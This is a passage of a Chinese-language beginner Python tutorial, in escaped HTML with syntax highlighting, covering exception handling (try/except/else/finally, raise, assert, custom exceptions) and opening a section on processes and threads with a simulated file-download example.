&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get_age&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;下面这个代码无论是否出现异常，都会重复执行：&lt;&#x2F;p&gt;
&lt;p&gt;捕获异常，与else语句结合&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;请输入一个整数：&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    b=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    c=a+b&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(c)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;TypeError:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;please try again&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#若没有异常，则执行else语句&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(b)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;异常清理&lt;&#x2F;p&gt;
&lt;p&gt;try…finally：用于实现异常清理，不管最终try语句有没有异常，都必须执行finally语句&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    file1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;filetest.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;w+&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;finally&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;IOerror,the file is closed&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;打开方式如果选择r，因为文件不存在，所以file1赋值不成功则会提示NameError，改为w+，会在本地创建文件，然后打开并读取文件的时候不会发现异常&lt;&#x2F;p&gt;
&lt;p&gt;try…except和try…finally是有区别的&lt;&#x2F;p&gt;
&lt;p&gt;try…finally是先执行try，完了之后再执行finally。file1因为文件不存在所以赋值失败，finally在调用file1这个变量的时候就会报NameError。&lt;&#x2F;p&gt;
&lt;p&gt;try…except是分开执行的，不存在except里面调用try的变量。如果文件不存在就报FileNotFoundError错误。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;test111.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        read_data = f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;finally&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;IOerror,the file is closed&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;try..except…finally&lt;&#x2F;p&gt;
&lt;p&gt;try…except…else…finally&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    file1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;filetest.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;w+&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;FileNotFoundError:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;please try again&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;good&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;finally&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;close the file&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;with…as…  ：with类似finally，用于实现程序不管是否异常都能执行as的代码&lt;&#x2F;p&gt;
&lt;p&gt;with 表达式 as 变量：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;filetest.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;异常触发&lt;&#x2F;p&gt;
&lt;p&gt;raise用于抛出异常，异常可以自己定义&lt;&#x2F;p&gt;
&lt;p&gt;raise 异常的类型 traceback&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;my_number&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;n&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;raise &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;NameError&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;invalid number!n&amp;lt;=0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(n)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;my_number&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;my_number&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;n&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;raise &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ValueError&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;invalid number!n&amp;lt;=0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(n)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;my_number&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;ValueError:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;please enter again&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;assert&lt;&#x2F;p&gt;
&lt;p&gt;有条件的触发异常，如果不满足则抛出AssertionError异常，相比raise，多了条件判断。但不用像raise一样抛出各种异常类型&lt;&#x2F;p&gt;
&lt;p&gt;语法：assert 条件判断,’traceback’&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;one does not equal two&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;one does not equal two&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;AssertionError:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;please try again&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;自定义异常类型&lt;&#x2F;p&gt;
&lt;p&gt;Python中自定义自己的异常类型非常简单，只需要从exception类继承即可&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;SomeCustomException&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Exception&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;pass&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;AnotherException&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;SomeCustomException&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;pass&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;如果内置的异常已经包括了所需要的异常，直接考虑使用内置异常即可。如果内置异常不能满足当前需求，则再考虑自定义异常类型。&lt;&#x2F;p&gt;
&lt;p&gt;Python的进程和线程&lt;&#x2F;p&gt;
&lt;p&gt;目前的计算机已经是多CPU多核时代，我们使用的操作系统也都是支持多任务操作的，这样我们就可以同时运行多个程序，也可以将一个程序分解为若干个相对独立的子任务，让多个子任务并发执行，可以缩短程序的执行时间。&lt;&#x2F;p&gt;
&lt;p&gt;进程&lt;&#x2F;p&gt;
&lt;p&gt;进程就是操作系统中执行的程序，操作系统是以进程为单位分配存储空间。&lt;&#x2F;p&gt;
&lt;p&gt;一个进程还可以拥有多个并发的执行线索，简单的说就是拥有多个可以获得CPU调度的执行单元，这就是所谓的线程。线程在同一个进程下，它们可以共享相同的上下文，相对于进程来说，线程间的信息共享和通信就更加容易&lt;&#x2F;p&gt;
&lt;p&gt;Python即支持多进程也支持多线程，因此使用Python实现并发编程主要有三种方式：多进程、多线程、多进程+多线程&lt;&#x2F;p&gt;
&lt;p&gt;Python中的多进程&lt;&#x2F;p&gt;
&lt;p&gt;Linux操作系统中提供fork()来创建进程，调用fork函数的是父进程，创建出来的是子进程，子进程是父进程的拷贝，但是子进程是有自己的PID，在Python中os模块提供了fork函数。由于Windows系统没有fork调用，因此要实现跨平台的多进程编程，可以使用‘multiprocessing’模块的’process’来创建子进程。&lt;&#x2F;p&gt;
&lt;p&gt;下面这个例子是通过单线程来进行文件下载：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;random &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time,sleep&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;download_task&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;filename&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;开始下载&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%filename)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    time_to_download=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(time_to_download)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;下载完成！耗费了&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;秒&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(filename,time_to_download))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    start=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;download_task&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Python学习手册.pdf&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;download_task&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;HTML学习教程.mp4&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    end=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
